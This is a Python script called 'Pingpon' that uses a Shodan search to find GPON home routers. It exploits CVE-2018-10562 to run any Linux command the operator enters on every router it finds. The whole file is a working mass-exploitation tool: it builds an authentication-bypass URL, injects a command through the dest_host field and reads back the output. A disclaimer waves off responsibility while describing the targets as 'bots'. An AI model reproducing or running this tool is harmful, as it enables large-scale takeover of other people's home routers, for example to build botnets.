#!/usr/bin/env python
import sys, requests, time, re, ssl, shodan
from pathlib import Path
from urllib.request import urlopen

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def banner():
	ascii_art = """

                ██████╗ ██╗███╗   ██╗ ██████╗ ██████╗  ██████╗ ███╗   ██╗
                ██╔══██╗██║████╗  ██║██╔════╝ ██╔══██╗██╔═══██╗████╗  ██║
                ██████╔╝██║██╔██╗ ██║██║  ███╗██████╔╝██║   ██║██╔██╗ ██║
                ██╔═══╝ ██║██║╚██╗██║██║   ██║██╔═══╝ ██║   ██║██║╚██╗██║
                ██║     ██║██║ ╚████║╚██████╔╝██║     ╚██████╔╝██║ ╚████║
                ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝      ╚═════╝ ╚═╝  ╚═══╝
                                                         
                                      Author: @037
                                      Version: 1.1

####################################### DISCLAIMER ##########################################
| Pingpon is a tool used to obtain thousands of vulnerable GPON home routers using Shodan   |
| to then execute any Linux command on using a remote code execution flaw (CVE-2018-10562). |
| I am NOT responsible for any damages caused or any crimes committed by using this tool.   |
#############################################################################################
	"""
	print(ascii_art)

def retrieve_results(target, command):
	try:
		fp = urlopen(target + '/diag.html?images/', context=ctx)
		for line in fp.readlines():
			if 'diag_result = \"Can\'t resolv hostname for' in line:
				start = '['
				end = ';' + command +']'
				res = str(line[line.find(start)+len(start):line.rfind(end)])
				return res.replace('\\n', '\n')
	except Exception as e:
		print("[DEBUG] " + str(e) + '\n')

def send_command(url_bypass, payload):
	try:
		req = requests.Request('POST', url_bypass, data=payload)
		prepared = req.prepare()
		s = requests.Session()
		s.send(prepared)
	except Exception as e:
		pass


if __name__ == "__main__":
	try:		
		banner()
		print('')
		keys = Path("./api.txt")
		if keys.is_file():
			with open('api.txt', 'r') as file:
				SHODAN_API_KEY=file.readline().rstrip('\n')
		else:
			file = open('api.txt', 'w')
			SHODAN_API_KEY = input('[*] Please enter a valid Shodan.io API Key: ')
			file.write(SHODAN_API_KEY)
			print('[~] File written: ./api.txt')
			file.close()
		api = shodan.Shodan(SHODAN_API_KEY)
		print('[~] Checking Shodan.io API Key: %s' % SHODAN_API_KEY)
		results = api.search('title:"GPON Home Gateway"')
		print('[✓] API Key Authentication: SUCCESS')
		print('')
		print('[~] Number of bots: %s' % results['total'])
		pcommand = input("[▸] Enter Linux command for mass execution: ")
		command = "'" + pcommand + "'"
		print('')
		for result in results['matches']:
			ipadd = 'http://' + result['ip_str']
			url_bypass = ipadd + '/GponForm/diag_Form?images/'
			payload = 'XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=`' + command + '`;' + command + '&ipv=0'
			send_command(url_bypass, payload)
			print("[root@" + result['ip_str'] + " ~]$ " + pcommand)
			time.sleep(3)
			out = retrieve_results(ipadd, command)
			print(out)
			print('')

	except Exception as e:
		print("[DEBUG] " + str(e) + '\n')	

